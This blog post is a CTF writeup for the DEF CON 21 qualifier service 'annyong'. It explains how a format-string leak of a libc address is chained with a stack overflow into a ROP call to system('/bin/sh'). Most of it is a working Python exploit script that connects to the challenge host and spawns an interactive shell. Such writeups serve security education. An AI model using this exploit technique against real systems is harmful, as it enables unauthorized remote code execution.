---
title: Defcon 21 Quals annyong writeup
author: kelwin
layout: post
permalink: /defcon-21-quals-annyong-writeup/
categories:
  - Uncategorized
---
For the annyong service, PIE and ASLR are enabled. It&#8217;s easy to discover a format string vulnerability and a stack overflow vulnerability. By leveraging format string attack, libc address on the stack is leaked. Then we can calculate the `system`, `/bin/sh`, and `pop rdi; ret` gadget address in libc. Luckily we have same libc edition with the remote server and get the offsets correctly, or we could get the right libc address by using a brute-force attack in a small range. Then we got a shell by overwritten the stack.

Our code is as below:

    import struct, socket, telnetlib
    
    def p64(addr):
        return struct.pack("<Q", addr)
    
    def interact(s):
        t = telnetlib.Telnet()                                                  
        t.sock = s                                                              
        t.interact()
        s.close()
    
    def send_recv(s, buf):
        s.send(buf)
        return s.recv(4096)
    
    HOST = "annyong.shallweplayaga.me"
    PORT = 5679
    
    s = socket.socket()
    s.connect((HOST, PORT))
    
    r = send_recv(s, "%173$p\n")
    lib_ref = int(r, 16)
    
    system_l = 0x45660
    binsh_l = 0x1799d1
    poprdi = 0x229f2
    lib_h = 0x7ffff7a39ed8
    lib_b = 0x7ffff7a60660 - system_l
    lib_base = lib_ref - lib_h + lib_b
    
    system_r = lib_base + system_l
    binsh_r = lib_base + binsh_l
    poprdi = lib_base + poprdi
    
    payload = "A" * 0x810 + 'B' * 8 +  p64(poprdi) + p64(binsh_r) + p64(system_r)
    r = send_recv(s, payload + "\n")
    
    print "We got a shell:"
    interact(s)